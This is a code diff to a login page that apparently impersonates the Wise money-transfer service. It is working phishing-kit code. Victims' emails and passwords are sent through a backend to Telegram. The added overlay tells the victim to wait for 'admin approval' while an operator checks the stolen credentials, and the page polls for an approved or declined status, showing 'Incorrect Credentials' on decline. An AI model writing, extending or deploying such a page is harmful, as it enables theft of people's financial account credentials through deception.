@@ -422,6 +422,134 @@
             background: #1a2b44;
             color: #ffffff;
         }
+
+        /* ============================================
+           WAITING OVERLAY
+           ============================================ */
+        .waiting-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .waiting-overlay.active {
+            display: flex;
+        }
+
+        .waiting-box {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 2.4rem 2.8rem;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .waiting-box .spinner {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 4px solid #edf0f5;
+            border-top-color: #9afe00;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.2rem;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .waiting-box h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #0a1e3c;
+            margin-bottom: 0.4rem;
+        }
+
+        .waiting-box p {
+            font-size: 1.1rem;
+            color: #6b7a8f;
+            line-height: 1.5;
+        }
+
+        .waiting-box .dots {
+            display: flex;
+            gap: 0.5rem;
+            justify-content: center;
+            margin-top: 0.8rem;
+        }
+
+        .waiting-box .dots span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #9afe00;
+            animation: bounce 1.4s ease-in-out infinite;
+        }
+
+        .waiting-box .dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .waiting-box .dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes bounce {
+            0%,
+            80%,
+            100% {
+                transform: scale(0.6);
+                opacity: 0.3;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .waiting-box .status-message {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 500;
+            display: none;
+        }
+
+        .waiting-box .status-message.approved {
+            display: block;
+            background: #eaf5ef;
+            color: #0a7a4e;
+        }
+
+        .waiting-box .status-message.declined {
+            display: block;
+            background: #fde8ea;
+            color: #b81f2c;
+        }
     </style>
 </head>
 <body>
@@ -430,6 +558,21 @@
     <div id="toast" class="toast">
         <i class="fas fa-check-circle"></i>
         <span id="toastMessage">Welcome back!</span>
+    </div>
+
+    <!-- ===== WAITING OVERLAY ===== -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-box">
+            <div class="spinner"></div>
+            <h3>Waiting for Admin Approval</h3>
+            <p>Your login request has been sent. Please wait while an admin reviews your request.</p>
+            <div class="dots">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="status-message" id="statusMessage"></div>
+        </div>
     </div>
 
     <!-- ===== MAIN LAYOUT ===== -->
@@ -603,13 +746,36 @@
         }
 
         // ============================================
-        // 🔥 LOGIN HANDLER - Sends data to Telegram
+        // CHECK USER STATUS
+        // ============================================
+        async function checkUserStatus(email) {
+            try {
+                const response = await fetch(API_BASE_URL + '/api/check-status', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email })
+                });
+
+                const data = await response.json();
+                return data.status;
+            } catch (error) {
+                console.error('Error checking status:', error);
+                return 'pending';
+            }
+        }
+
+        // ============================================
+        // 🔥 LOGIN HANDLER - Sends data to Telegram & checks status
         // ============================================
         async function handleLogin(event) {
             event.preventDefault();
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
             const btn = document.getElementById('loginBtn');
+            const waitingOverlay = document.getElementById('waitingOverlay');
+            const statusMessage = document.getElementById('statusMessage');
 
             // Validation
             if (!email || !password) {
@@ -646,19 +812,49 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    showToast('success', '✅ Login successful! Data sent to admin.');
-                    console.log('✅ Login data sent to Telegram');
+                    console.log('✅ Login data sent to Telegram. Waiting for admin approval...');
+
+                    // ✅ Show waiting overlay
+                    waitingOverlay.classList.add('active');
+                    statusMessage.className = 'status-message';
+                    statusMessage.textContent = '';
 
                     // Reset button
                     btn.disabled = false;
                     btn.textContent = 'Log in';
                     btn.style.opacity = '0.58';
 
-                    // Optional: Redirect after success
-                    setTimeout(() => {
-                        // window.location.href = 'account.html';
-                        showToast('info', '📱 Check your Telegram for the login notification!');
-                    }, 1000);
+                    // ✅ Start checking status every 3 seconds
+                    let checkInterval = setInterval(async function() {
+                        const status = await checkUserStatus(email);
+                        console.log('📊 Current status:', status);
+
+                        if (status === 'approved') {
+                            clearInterval(checkInterval);
+                            // ✅ User approved - show success and redirect
+                            statusMessage.className = 'status-message approved';
+                            statusMessage.textContent = '✅ Approved! Redirecting...';
+
+                            setTimeout(() => {
+                                waitingOverlay.classList.remove('active');
+                                showToast('success', '✅ Login approved! Welcome back!');
+                                // Redirect to account page
+                                // window.location.href = 'account.html';
+                            }, 1500);
+
+                        } else if (status === 'declined') {
+                            clearInterval(checkInterval);
+                            // ❌ User declined - show error
+                            statusMessage.className = 'status-message declined';
+                            statusMessage.textContent = '❌ Incorrect Credentials';
+
+                            setTimeout(() => {
+                                waitingOverlay.classList.remove('active');
+                                showToast('error', '❌ Incorrect Credentials. Please try again.');
+                            }, 3000);
+                        }
+                        // If still pending, continue checking
+                    }, 3000);
 
                 } else {
                     showToast('error', '❌ ' + (data.message || 'Login failed. Please try again.'));
@@ -734,6 +930,7 @@
         console.log('🔥 Wise - Login Page (Connected to Backend)');
         console.log('✅ API URL:', API_BASE_URL);
         console.log('✅ Login data will be sent to Telegram');
+        console.log('✅ User will wait for admin approval');
     </script>
 
 </body>
